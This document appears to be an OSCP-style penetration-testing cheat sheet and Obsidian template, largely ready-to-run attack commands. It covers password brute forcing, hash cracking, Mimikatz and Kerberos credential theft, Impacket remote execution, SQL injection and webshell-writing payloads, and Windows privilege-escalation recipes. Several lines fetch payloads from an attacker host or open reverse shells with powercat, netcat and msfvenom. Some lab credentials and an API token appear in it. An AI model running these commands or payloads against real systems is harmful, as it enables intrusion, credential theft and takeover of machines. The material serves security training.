wpscan --url http://<% tp.frontmatter["RHOST"] %> -U <% tp.frontmatter["USERNAME"] %> -P passwords.txt -t 50
wpscan --rua -e ap,at,tt,cb,dbe,u,m --url http://<% tp.frontmatter["RHOST"] %> --plugins-detection aggressive

<example>
wpscan --url [http://192.168.243.244](http://192.168.243.244) --enumerate p --plugins-detection aggressive  --api-token qLVQId1c9vb4suVQzft2zhHusr9BsSaSpxcanRW6qSA
<example>

<example>
wpscan --url http://ipaddress.of.website/ --enumerate vp --api-token API-TOKEN
<example>

# WPScan Login Brute Force
First collect usernames
wpscan –url 192.168.189.142 –enumerate u
Use Wordlist to bruteforce the user password
wpscan –url 192.168.189.142 –wordlist /usr/share/wordlists/rockyou.txt –username admin


# Hydra
hydra <% tp.frontmatter["RHOST"] %> -l <% tp.frontmatter["USERNAME"] %> -P /usr/share/wordlists/<FILE> ftp|ssh|smb://<% tp.frontmatter["RHOST"] %>
hydra -l <% tp.frontmatter["USERNAME"] %> -P /usr/share/wordlists/rockyou.txt <% tp.frontmatter["RHOST"] %> http-post-form "/admin.php:username=^USER^&password=^PASS^:login_error"

sudo hydra -L /usr/share/wordlists/rockyou.txt -p "<% tp.frontmatter["PASSWORD"] %>" rdp://<% tp.frontmatter["RHOST"] %>
sudo hydra -l george -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://<% tp.frontmatter["RHOST"] %>

#crowbar
#  RDP brute forcing a single IP address using a single username and a single password:
./crowbar.py -b rdp -s <% tp.frontmatter["RHOST"] %>/32 -u admin -c Aa123456
 # username list and a single password
 ./crowbar.py -b rdp -s <% tp.frontmatter["RHOST"] %>/32 -U ~/Desktop/userlist -c passw0rd
 # username and a single password list
  ./crowbar.py -b rdp -s <% tp.frontmatter["RHOST"] %>/32 -u localuser -C ~/Desktop/passlist
 # username list and password list
 ./crowbar.py -b rdp -s <% tp.frontmatter["RHOST"] %>/24 -U ~/Desktop/userlist -C ~/Desktop/passlist -d
```


### Cracking 
```bash
# Hashcat

Asrep Roast
hashcat -m 18200 -a 0 <FILE> <FILE>
sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
hashcat -m 18200-a 0asrep.txt passwords.txt --outfile asrepcrack.txt --forcehashcat

Kerberoast 
hashcat -m 13100 --force <FILE> <FILE>
sudo hashcat -m 13100 hashes.kerberoast2 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force


#keypass
keepass2<% tp.frontmatter["USERNAME"] %> Database.kdbx > keepass.hash
#make sure to remove "Database:" Before cracking with hashcat

hashcat --help | grep -i "KeePass"
hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force

#id_rsa
ssh2<% tp.frontmatter["USERNAME"] %> id_rsa > ssh.hash
hashcat -h | grep -i "ssh"
hashcat -m 22921 ssh.hash ssh.passwords -r ssh.rule --force
hashcat -m 22921 ssh.hash /usr/share/wordlists/rockyou.txt

#ntlm
hashcat --help | grep -i "ntlm"
hashcat -m 1000 hashes.dcsync /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force

#ntlmv2
hashcat --help | grep -i "ntlm"
hashcat -m 5600 paul.hash /usr/share/wordlists/rockyou.txt --force

```




## Mimikatz & bloodhound & Rubeus
```powershell
https://gist.github.com/insi2304/484a4e92941b437bad961fcacda82d49

# mimikatz
privilege::debug
token::elevate
lsadump::sam
lsadump::lsa
lsadump::secrets
sekurlsa::logonpasswords
lsadump::cache

.\mimikatz "privilege::debug" "token::elevate"  "lsadump::sam " exit
sekurlsa::minidump /users/admin/Desktop/lsass.DMP
sekurlsa::LogonPasswords

Generate TGT with NTLM
kerberos::golden /domain:<% tp.frontmatter["DOMAIN"] %>/sid:<SID> /rc4:<KRBTGT_NTLM_HASH> /user:<% tp.frontmatter["USERNAME"] %>

Inject TGT with Mimikatz
kerberos::ptt <KIRBI_FILE>

# bloodhound
bloodhound-python -d <% tp.frontmatter["DOMAIN"] %> -u <% tp.frontmatter["USERNAME"] %> -p "<% tp.frontmatter["PASSWORD"] %>" -gc <% tp.frontmatter["DOMAIN"] %> -c all -ns <% tp.frontmatter["RHOST"] %>
bloodhound-python -u <% tp.frontmatter["USERNAME"] %> -p '<% tp.frontmatter["PASSWORD"] %>' -d <% tp.frontmatter["DOMAIN"] %> -ns <% tp.frontmatter["RHOST"] %> -c All
bloodhound-python -u <% tp.frontmatter["USERNAME"] %> -p '<% tp.frontmatter["PASSWORD"] %>' -d <% tp.frontmatter["DOMAIN"] %> -dc <% tp.frontmatter["RHOST"] %> -ns <% tp.frontmatter["RHOST"] %> --dns-tcp -no-pass -c ALL --zip


# Rubeus

Overpass the hash
Rubeus.exe kerberoast /user:<% tp.frontmatter["USERNAME"] %>

Pass the hash
.\Rubeus.exe asktgt /user:Administrator /certificate:7F052EB0D5D122CEF162FAE8233D6A0ED73ADA2E /getcredentials

RunasCs
./RunasCs.exe -l 3 -d <% tp.frontmatter["DOMAIN"] %> "<% tp.frontmatter["USERNAME"] %>" '<% tp.frontmatter["PASSWORD"] %>' 'C:\Users\<% tp.frontmatter["USERNAME"] %>\Downloads\<FILE>.exe'
./RunasCs.exe -d <% tp.frontmatter["DOMAIN"] %> "<% tp.frontmatter["USERNAME"] %>" '<% tp.frontmatter["PASSWORD"] %>' cmd.exe -r <% tp.frontmatter["LHOST"] %>:<LPORT>

winexe
winexe -U '<% tp.frontmatter["USERNAME"] %>%<% tp.frontmatter["PASSWORD"] %>' //<% tp.frontmatter["RHOST"] %> cmd.exe
winexe -U '<% tp.frontmatter["USERNAME"] %>%<% tp.frontmatter["PASSWORD"] %>' --system //<% tp.frontmatter["RHOST"] %> cmd.exe
```


# Invoke-RunasCs.ps1 https://github.com/antonioCoco/RunasCs/blob/master/Invoke-RunasCs.ps1
```bash
Invoke-RunasCs -Username svc_mssql -Password trustno1 -Command "whoami"
Invoke-RunasCs -Username svc_mssql -Password trustno1 -Command "Powershell IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.176:8000/powercat.ps1');powercat -c 192.168.45.176 -p 5555 -e cmd"
```



# Impacket
```bash
impacket-mssqlclient <% tp.frontmatter["USERNAME"] %>:<% tp.frontmatter["PASSWORD"] %>@<% tp.frontmatter["RHOST"] %> -windows-auth

psexec.py <% tp.frontmatter["DOMAIN"] %>/<% tp.frontmatter["USERNAME"] %>:'<% tp.frontmatter["PASSWORD"] %>'@<% tp.frontmatter["RHOST"] %>
psexec.py -hashes  ntlm:ntlm <% tp.frontmatter["USERNAME"] %>@<% tp.frontmatter["RHOST"] %>


wmiexec.py <% tp.frontmatter["DOMAIN"] %>/<% tp.frontmatter["USERNAME"] %>:'<% tp.frontmatter["PASSWORD"] %>'@<% tp.frontmatter["RHOST"] %>
wmiexec.py -hashes  ntlm:ntlm <% tp.frontmatter["USERNAME"] %>@<% tp.frontmatter["RHOST"] %>


impacket-getTGT <% tp.frontmatter["RHOST"] %>/<% tp.frontmatter["USERNAME"] %>:<% tp.frontmatter["PASSWORD"] %>
impacket-getTGT <% tp.frontmatter["RHOST"] %>/<% tp.frontmatter["USERNAME"] %> -dc-ip <% tp.frontmatter["RHOST"] %> -hashes aad3b435b51404eeaad3b435b51404ee:7c662956a4a0486a80fbb2403c5a9c2c

impacket-GetNPUsers <% tp.frontmatter["RHOST"] %>/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
impacket-GetNPUsers <% tp.frontmatter["RHOST"] %>/<% tp.frontmatter["USERNAME"] %> -request -no-pass -dc-ip <% tp.frontmatter["RHOST"] %>
impacket-GetNPUsers <% tp.frontmatter["RHOST"] %>/ -usersfile usernames.txt -format <% tp.frontmatter["USERNAME"] %> -outputfile hashes


export KRB5CCNAME=<% tp.frontmatter["USERNAME"] %>.ccache
impacket-GetUserSPNs <% tp.frontmatter["RHOST"] %>/<% tp.frontmatter["USERNAME"] %>:<% tp.frontmatter["PASSWORD"] %> -k -dc-ip <% tp.frontmatter["RHOST"] %>.<% tp.frontmatter["RHOST"] %> -no-pass -request

export KRB5CCNAME=<% tp.frontmatter["USERNAME"] %>.ccache
impacket-secretsdump <% tp.frontmatter["RHOST"] %>/<% tp.frontmatter["USERNAME"] %>@<% tp.frontmatter["RHOST"] %>
impacket-secretsdump -k <% tp.frontmatter["RHOST"] %>/<% tp.frontmatter["USERNAME"] %>@<% tp.frontmatter["RHOST"] %>.<% tp.frontmatter["RHOST"] %> -no-pass -debug
impacket-secretsdump -ntds ndts.dit -system system -hashes lmhash:nthash LOCAL -output nt-hash
impacket-secretsdump -dc-ip <% tp.frontmatter["RHOST"] %> <% tp.frontmatter["RHOST"] %>.LOCAL/svc_bes:<% tp.frontmatter["PASSWORD"] %>@<% tp.frontmatter["RHOST"] %>
impacket-secretsdump -sam SAM -security SECURITY -system SYSTEM LOCAL
impacket-secretsdump medtech.com/joe:'Flowers1'@172.16.208.11

```


# Attacks

#### Bruteforce
```
./kerbrute -domain <% tp.frontmatter["DOMAIN"] %> -users <FILE> -passwords <FILE> -outputfile <FILE>
.\Rubeus.exe brute /users:<FILE> /passwords:<FILE> /domain:<% tp.frontmatter["DOMAIN"] %> /outfile:<FILE>
.\Rubeus.exe brute /passwords:<FILE> /outfile:<FILE>

```


#### AsRepRoast
```bash
# Domain users ( Creds required)
impacket-GetNPUsers <% tp.frontmatter["DOMAIN"] %>/<% tp.frontmatter["USERNAME"] %>:<% tp.frontmatter["PASSWORD"] %> -request -format hashcat -outputfile <FILE>
impacket-GetNPUsers <% tp.frontmatter["DOMAIN"] %>/<% tp.frontmatter["USERNAME"] %>:<% tp.frontmatter["PASSWORD"] %> -request -format <% tp.frontmatter["USERNAME"] %> -outputfile <FILE>

# List of users (No Creds)
impacket-GetNPUsers <% tp.frontmatter["DOMAIN"] %>/ -usersfile <FILE> -format hashcat -outputfile <FILE>
impacket-GetNPUsers <% tp.frontmatter["DOMAIN"] %>/ -usersfile <FILE> -format <% tp.frontmatter["USERNAME"] %> -outputfile <FILE>


.\Rubeus.exe asreproast  /format:hashcat /outfile:<FILE>

```
		
#### Kerberoasting
```powershell
impacket-GetUserSPNs <% tp.frontmatter["DOMAIN"] %>/<% tp.frontmatter["USERNAME"] %>:<% tp.frontmatter["PASSWORD"] %> -outputfile <FILE>

.\Rubeus.exe kerberoast /outfile:<FILE>

iex (new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1")

Invoke-Kerberoast -OutputFormat hashcat | % { $_.Hash } | Out-File -Encoding ASCII <FILE>
Invoke-Kerberoast -OutputFormat <% tp.frontmatter["USERNAME"] %> | % { $_.Hash } | Out-File -Encoding ASCII <FILE>
```


#### OverPassTheHash / PassTheKey 
```bash

# Request-TGT 
impacket-getTGT <% tp.frontmatter["DOMAIN"] %>/<% tp.frontmatter["USERNAME"] %> -hashes <LMHASH>:<NTLMHASH>

# Req-TGT with password
impacket-getTGT <% tp.frontmatter["DOMAIN"] %>/<% tp.frontmatter["USERNAME"] %>:<% tp.frontmatter["PASSWORD"] %>

# Ask and inject TGT
.\Rubeus.exe asktgt /domain:<% tp.frontmatter["DOMAIN"] %> /user:<% tp.frontmatter["USERNAME"] %> /rc4:<NTLMHASH> /ptt

.\PsExec.exe -accepteula \\<% tp.frontmatter["RHOST"] %> cmd
```

#### Execute commands remotely

```
impacket-psexec <% tp.frontmatter["DOMAIN"] %>/<% tp.frontmatter["USERNAME"] %>@<% tp.frontmatter["RHOST"] %> -k -no-pass
impacket-smbexec <% tp.frontmatter["DOMAIN"] %>/<% tp.frontmatter["USERNAME"] %>@<% tp.frontmatter["RHOST"] %> -k -no-pass
impacket-wmiexec <% tp.frontmatter["DOMAIN"] %>/<% tp.frontmatter["USERNAME"] %>@<% tp.frontmatter["RHOST"] %> -k -no-pass


```



### Web
```bash

# webdav
davtest [-auth <% tp.frontmatter["USERNAME"] %>:<% tp.frontmatter["PASSWORD"] %>] -move -sendbd auto -url http://<% tp.frontmatter["RHOST"] %> #Uplaod .txt files and try to move it to other extensions
davtest [-auth <% tp.frontmatter["USERNAME"] %>:<% tp.frontmatter["PASSWORD"] %>] -sendbd auto -url http://<% tp.frontmatter["RHOST"] %> #Try to upload every extension

cadaver <% tp.frontmatter["RHOST"] %>


Autorecon

autorecon <% tp.frontmatter["RHOST"] %> --exclude-tags="dirbuster,top-100-udp-ports,enum4linux,top-tcp-ports" 
autorecon <% tp.frontmatter["RHOST"] %> --exclude-tags="dirbuster,top-100-udp-ports,enum4linux,top-tcp-ports"  --dirbuster.tool ffuf
autorecon <% tp.frontmatter["RHOST"] %> --exclude-tags="dirbuster,top-100-udp-ports,enum4linux,top-tcp-ports" --dirbuster.tool ffuf -vv
# if you want to omit portscans of all port if you already have the list!
autorecon <% tp.frontmatter["RHOST"] %> --exclude-tags="dirbuster,top-100-udp-ports,enum4linux,top-tcp-ports,all-tcp-ports" --dirbuster.tool ffuf -vv
```

### Check if running powershell or cmd
```bash
(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell
```


### ssh-keygen
```bash
kali@kali:~$ssh-keygen
Generating public/private rsa key pair.
Enter file in which to save the key (/home/kali/.ssh/id_rsa):fileup
Enter passphrase (empty for no passphrase):
Enter same passphrase again:
Your identification has been saved in fileupYour public key has been saved in fileup.pub
...

kali@kali:~$cat fileup.pub > authorized_keys
```

### mysql
```bash
mysql -u root -p'root' -h 192.168.50.16 -P 3306
select version();
select system_user();
show databases;
SELECT user, authentication_string FROM mysql.user WHERE user = 'offsec';
```

### mysql useful queries
```bash
SELECT LOAD_FILE("C:/TEMP/phoneinfo.dll") INTO DUMPFILE "C:/Windows/System32/phoneinfo.dll";

SELECT 
"<?php echo \'<form action=\"\" method=\"post\" enctype=\"multipart/form-data\" name=\"uploader\" id=\"uploader\">\';echo \'<input type=\"file\" name=\"file\" size=\"50\"><input name=\"_upl\" type=\"submit\" id=\"_upl\" value=\"Upload\"></form>\'; if( $_POST[\'_upl\'] == \"Upload\" ) { if(@copy($_FILES[\'file\'][\'tmp_name\'], $_FILES[\'file\'][\'name\'])) { echo \'<b>Upload Done.<b><br><br>\'; }else { echo \'<b>Upload Failed.</b><br><br>\'; }}?>"
INTO OUTFILE 'C:/Windows/System32/uploader.php';
```


### mysql sqli
```bash
#Error-based Payloads
offsec' OR 1=1 -- //
' or 1=1 in (select @@version) -- //
' OR 1=1 in (SELECT * FROM users) -- //
' or 1=1 in (SELECT password FROM users) -- //
' or 1=1 in (SELECT password FROM users WHERE username = 'admin') -- //

#UNION-based payloads
' ORDER BY 1-- //
%' UNION SELECT database(), user(), @@version, null, null -- //
' UNION SELECT null, null, database(), user(), @@version  -- //
' union select null, table_name, column_name, table_schema, null from information_schema.columns where table_schema=database() -- //
' UNION SELECT null, username, password, description, null FROM users -- //

#Blind SQL Injections
#boolean-based SQLi
http://192.168.50.16/blindsqli.php?user=offsec' AND 1=1 -- //
#time-based SQLi
http://192.168.50.16/blindsqli.php?user=offsec' AND IF (1=1, sleep(3),'false') -- //

#
' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //
```


### mssql
```bash
impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth
SELECT @@version;
SELECT name FROM sys.databases;
SELECT * FROM offsec.information_schema.tables;
select * from offsec.dbo.users;
```

### mssql sqli
```bash
#Manual Code Execution
impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth
EXECUTE sp_configure 'show advanced options', 1;
RECONFIGURE;
EXECUTE sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
EXECUTE xp_cmdshell 'whoami';
```

### Password hash
```bash
echo -n "secret" | sha256sum
```


### Hash Identifier
![image](https://github.com/nuricheun/OSCP/assets/14031269/ca7ce199-47ed-4a09-bdc8-3184ea590ef5)



### POWERSHELL LOCAL ENUM
```bash
Get-LocalUser
```

### Proxychains
```bash
proxychains -q nmap -vvv -sT --top-ports 20 -Pn 172.16.208.10


# impacket ap-rep
proxychains -q impacket-GetNPUsers -dc-ip 172.16.234.10 -request  medtech.com/yoshi

# impacket kerbroasting
proxychains -q  impacket-GetUserSPNs -request -dc-ip 172.16.234.10 medtech.com/yoshi

```

### Sharphound
```bash
powershell -ep bypass
. .\Sharphound.ps1
Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\stephanie\Desktop\ -OutputPrefix "corp audit"
```


### Powershell To Query Services
```bash
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
### when apps are installed on C:\ directly, we may be able to replace the executable files since they're not located on C:\Windows\System32
```

### PowerUp.ps1 
```bash
. .\PowerUp.ps1

## Check misconfig
Invoke-AllChecks

### Displays services the currnet user can modify
Get-ModifiableServiceFile
```

### winPEAS
```bash
# give winPEAS color
reg add HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1
```

### query sheduled tasks
```bash
schtasks /query /fo LIST /v
```


### query service
```bash
Get-CimInstance -ClassName win32_service

#Check if the service can be started automatically(so we can reboot the machine)
Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'mysql'}
```

### icacls
```bash
icacls "C:\xampp\apache\bin\httpd.exe"
```


### shutdown 
```bash
### With SeShutdownPrivilege we can reboot the machine
shutdown /r /t 0
```

### accesschk
```bash
.\accesschk.exe /accepteula -uwcqv yoshi servicename
.\accesschk.exe /accepteula -uwcqv "Authenticated Users" *

```
![image](https://github.com/nuricheun/OSCP/assets/14031269/7c0c468a-3c88-4a71-8bbb-6b15fa85359f)

### sc
```bash
sc qc service
```
![image](https://github.com/nuricheun/OSCP/assets/14031269/987fc700-4a40-4445-8a8c-24b2b65da9f4)


### Priv Esc Windows Local Enumeration
```bash
# username and hostname
C:\Users\dave>whoami
whoami
clientwk220\dave

# currnet user's privilege
C:\Users\dave>whoami /priv

# Group memberships of the current user
whoami /groups

# Existing other users and groups
net user || Get-LocalUser
net localgroup || Get-LocalGroup
Get-LocalGroupMember adminteam
Get-LocalGroupMember Administrators

# Operating system, version and architecture
systeminfo

# Network information
ipconfig /all
route print
#List all active network connections
netstat -ano

# Installed applications
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
## Additionally we should always check 32-bit and 64-bit Program Files directories located in C:\.
## Also we should review the contents of the Downloads directory of our user to find more potential programs.

# Running processes
Get-Process

# Search for juicy files on Windows
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\xampp -Include *.txt,*.ini,*.pdf,*.log -File -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\Users\dave\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue

# Powershell
Get-History
(Get-PSReadlineOption).HistorySavePath
```

### Windows runas other user
```bash
runas /user:backupadmin cmd
```

### Add user on windows
```bash
Net User /Add <newusername>

#set password
net user <newusername> password123!

#add user to a group
net localgroup <groupname> <username> /add
```

### Cross Compiling
```bash
### compile C code to a 64- bit application
x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
```


### exiftool
```bash
exiftool WElcomeLetter.pdf
```

### keepass cracking
```bash
keepass2john Database.kdbx > keepass.hash
hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt --force 
```

### KPCLI to use kdbx
```bash
sudo apt install kpcli
kpcli --kdb=Database.kdbx
```


### Linux enumeration: must search ssh related files on directory traversal
```bash
/home/user/.ssh/id_ecdsa
/home/user/.ssh/id_eddsa
/home/user/.ssh/id_dsa
/home/user/.ssh/id_rsa
```





### ssh Port Forwarding
```bash
ssh -R <mykali-port>127:0.0.1:<service-port> <username>@<local-machine>
ssh -R 4444:127.0.0.1:3306 kali@192.168.x.x
ssh -R 127.0.0.1:2345:127.0.0.1:8000 kali@192.168.45.176

mysql -u root -h 127.0.0.1 -P 4444
select @@hostname;
```

### Password cracking with john
```bash
john --format=sha512crypt --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

### Verify permissions on each file
```bash
ls -l /etc/shadow
```

### Generate hash from a password
```bash
# replace x of root's from /etc/passwd file (When have permissions)
openssl passwd 'passwd'
```

### wsgi settings
```bash
pip3 install wsgidav
mkdir /root/webdav
locate wsgidav
/usr/local/bin/wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /root/webdav
```

### Privesc: Umbraco 7.12.4 exploit
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.176 LPORT=7777 -f exe > revshell7777.exe$ python -m http.server --bind 10.10.15.222 8080
$ python exploit.py -u admin@htb.local -p baconandcheese -i 'http://10.10.10.180' -c powershell.exe -a '-NoProfile -Command ls'


    Directory: C:\windows\system32\inetsrv


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        2/19/2020   3:11 PM                Config
d-----        2/19/2020   3:11 PM                en
d-----        2/19/2020   3:11 PM                en-US
...

$ python3 ./49488.py -u mark@relia.com -p OathDeeplyReprieve91 -i http://web02.relia.com:14080 -c powershell.exe -a '-NoProfile -Command wget http://192.168.45.176/revshell7777.exe -Outfile C:/Users/Public/noraj.exe'
$ python3 ./49488.py -u mark@relia.com -p OathDeeplyReprieve91 -i http://web02.relia.com:14080 -c powershell.exe -a '-NoProfile -Command C:/Users/Public/noraj.exe'
```

++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

## Windows Privesc

### Windows Privileges:::
### SeRestorePrivilege
1. Rename C:\Windows\System32\utilman.exe to C:\Windows\System32\utilman.old
```bash
ren "utilman.exe" "utilman.old"
```
2. Rename C:\Windows\System32\cmd.exe to C:\Windows\System32\utilman.exe
```bash
ren "cmd.exe" "utilman.exe"
```
3. On kali machine, start rdesktop 192.168.216.165
```bash
┌──(root㉿kali)-[~/offsec]
└─# rdesktop 192.168.216.165
```
4. When there’s a popup, press window key and “u”
![Untitled](https://prod-files-secure.s3.us-west-2.amazonaws.com/5be1175e-fc2e-4935-8bc7-6e0cde8d69d3/613346fc-3f4d-4e34-a634-3d2ac9ad0edc/Untitled.png)
5. We have a system shell!!!

### SeManageVolumePrivilege https://github.com/CsEnox/SeManageVolumeExploit
```bash
.\SeManageVolumeExploit.exe
Entries changed: 923
DONE 

C:\TEMP>move C:\TEMP\Printconfig.dll C:\Windows\System32\spool\drivers\x64\3\Printconfig.dll
move C:\TEMP\Printconfig.dll C:\Windows\System32\spool\drivers\x64\3\Printconfig.dll
Overwrite C:\Windows\System32\spool\drivers\x64\3\Printconfig.dll? (Yes/No/All): yes
yes
        1 file(s) moved.

C:\TEMP>powershell
powershell
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\TEMP> $type = [Type]::GetTypeFromCLSID("{854A20FB-2D44-457D-992F-EF13785D2B51}")
$type = [Type]::GetTypeFromCLSID("{854A20FB-2D44-457D-992F-EF13785D2B51}")
PS C:\TEMP> $object = [Activator]::CreateInstance($type)
$object = [Activator]::CreateInstance($type)
```




### Windows Privesc: PrintSpoofer
```bash
iwr -uri http://192.168.45.176/PrintSpoofer64.exe -Outfile PrintSpoofer.exe
iwr -uri http://192.168.45.176/nc.exe -Outfile nc.exe
.\PrintSpoofer.exe -c "C:\TEMP\nc.exe 192.168.45.176 1337 -e cmd"
```

### Windows Privesc: Rogue Potato
```bash

sudo socat tcp-listen:135,reuseaddr,fork tcp:<TARGET.MACHINE.IP>:9999
## sudo socat tcp-listen:135,reuseaddr,fork tcp:192.168.217.247:9999

msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.176 LPORT=53 -f exe > reverse.exe
nc -nvlp 53

iwr -uri http://192.168.45.176/RoguePotato.exe -Outfile RoguePotato.exe
iwr -uri http://192.168.45.176/reverse.exe -Outfile reverse.exe

.\RoguePotato.exe -r 192.168.45.176 -l 9999 -e ".\reverse.exe"
```

### Windows Privesc: God Potato(https://github.com/BeichenDream/GodPotato)
```bash
.\GodPotato.exe -cmd "cmd /c whoami"
.\GodPotato.exe -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.45.176 7777"
```

### Windows Privesc: Service Commands
```bash
# Query the configuration of a service:
sc.exe qc <name>
# Query the current status of a service:
sc.exe query <name>
# Modify a configuration option of a service:
sc.exe config <name> <option>= <value>
#Start/Stop a service:
net start/stop <name>
```

### Windows Privesc: Insecure Service Permissions
```bash
# Check if we can modify the "daclsvc" service
.\accesschk.exe /accepteula -uwcqv user daclsvc
# Check the current configuration of the service(to see if we have to manually start the service or it does automatically)
sc qc daclsvc
# Check current status of the service
sc query daclsvc
# Reconfigure the service to use our reverse shell executable
sc config daclsvc binpath= "\"C:\PrivEsc\reverse.exe\""
# Start a listener on Kali then start the service to trigger the exploit
net start daclsvc
```

### Windows Privesc: Unquoted Service Path
```bash
# Run winPEAS to check for service misconfigurations
.\winPEASany.exe quiet servicesinfo

# First let's check if we can start and stop the service
.\accesschk.exe /accepteula -ucqv user unquotedsvc

# Confirm this using sc
sc qc unquotedsvc

# Use accesschk.exe to check for write permissions on the path/directory:
.\accesschk.exe /accepteula -uwdq C:\
.\accesschk.exe /accepteula -uwdq "C:\Program Files\"
.\accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\"

# Copy the reverse shell executable and rename it appropriately
copy C:\PrivEsc\reverse.exe "C:\Program Files\Unquoted Path Service\Common.exe"

# Start a listener on Kali, and then start the service to trigger the exploit
net start unquotedsvc
```

### Windows Privesc: Weak Registry Permissions
```bash
# Run winPEAS to check for service misconfigurations:
> .\winPEASany.exe quiet servicesinfo
# Note that the “regsvc” service has a weak registry entry. We can confirm this with PowerShell:
PS> Get-Acl HKLM:\System\CurrentControlSet\Services\regsvc | Format-List
# Alternatively accesschk.exe can be used to confirm:
> .\accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc

# Check if we can start the service
.\accesschk.exe /accepteula -ucqv user regsvc

# Check current value
reg query HKLM\SYSTEM\CurrentControlSet\services\regsvc

# Overwrite the ImagePath registry key to point to our reverse shell executable:
> reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\reverse.exe /f
# Start a listener on Kali, and then start the service to trigger the exploit:
> net start regsvc
```


### Windows Privesc: Insecure Service Executables
```bash
# Run winPEAS to check for service misconfigurations
.\winPEASany.exe quiet servicesinfo

# Note that the “filepermsvc” service has an executable which appears to be writable by everyone. We can confirm this with accesschk.exe
.\accesschk.exe /accepteula -quvw "C:\Program Files\File Permissions Service\filepermservice.exe"

# Check if we can stop and start the service
.\accesschk.exe /accepteula -uvqc filepermsvc

# Create a backup of the original service executable
copy "C:\Program Files\File Permissions Service\filepermservice.exe" C:\Temp

# Copy the reverse shell executable to overwrite the service executable
copy /Y C:\PrivEsc\reverse.exe "C:\Program Files\File Permissions Service\filepermservice.exe"

# Start a listener on Kali, and then start the service to trigger the exploit
net start filepermsvc
```

### Windows Privesc: DLL Hijacking
```bash

```

### Windows Privesc: AUTORUN
![image](https://github.com/nuricheun/OSCP/assets/14031269/d21e2773-72aa-42c6-aa07-9d40f79f39f5)
```bash
# Use winPEAS to check for writable AutoRun executables:
> .\winPEASany.exe quiet applicationsinfo
# Alternatively, we could manually enumerate the AutoRun executables:
> reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
# And then use accesschk.exe to verify the permissions on each one:
> .\accesschk.exe /accepteula -wvu "C:\Program Files\Autorun Program\program.exe"
# The “C:\Program Files\Autorun Program\program.exe” AutoRun executable is writable by Everyone. Create a backup of the original:
> copy "C:\Program Files\Autorun Program\program.exe" C:\Temp
# Copy our reverse shell executable to overwrite the AutoRun executable:
> copy /Y C:\PrivEsc\reverse.exe "C:\Program Files\Autorun Program\program.exe"
# Start a listener on Kali, and then restart the Windows VM to trigger the exploit. Note that on 
Windows 10, the exploit appears to run with the privileges of the last logged on user, so log 
out of the “user” account and log in as the “admin” account first.
```

### Windows Privesc: AlwaysInstallElevated
Warning:: These two keys must be set to 1 like in the screenshot
![image](https://github.com/nuricheun/OSCP/assets/14031269/a88b9154-826f-4710-a538-e30ab9b496af)
The “AlwaysInstallElevated” value must be set to 1 for both the local machine:
HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
and the current user:
HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer

```bash
1. Use winPEAS to see if both registry values are set:
> .\winPEASany.exe quiet windowscreds
2. Alternatively, verify the values manually:
> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
# Create a new reverse shell with msfvenom, this time using the msi format, and save it with the .msi extension:
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.11 LPORT=53 -f msi -o reverse.msi
# Copy the reverse.msi across to the Windows VM, start a listener on Kali, and run the installer to trigger the exploit:
> msiexec /quiet /qn /i C:\PrivEsc\reverse.msi
```

### Windows Privesc: Searching the Registry for Passwords
The following commands will search the registry for keys and values that conians "password"
```bash
